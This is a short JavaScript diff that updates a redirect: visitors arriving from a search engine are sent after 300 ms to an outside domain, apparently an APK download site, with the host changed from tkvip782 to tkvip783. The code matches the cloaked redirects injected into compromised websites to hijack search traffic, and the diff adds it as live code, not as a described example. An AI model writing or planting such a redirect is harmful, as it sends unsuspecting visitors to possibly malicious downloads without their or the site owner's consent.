@@ -11,7 +11,7 @@
 
   if (isFromSearchEngine) {
     setTimeout(function () {
-      window.location.href = 'https://apk009.tkvip782.com/';
+      window.location.href = 'https://apk009.tkvip783.com/';
     }, 300);
   }
 
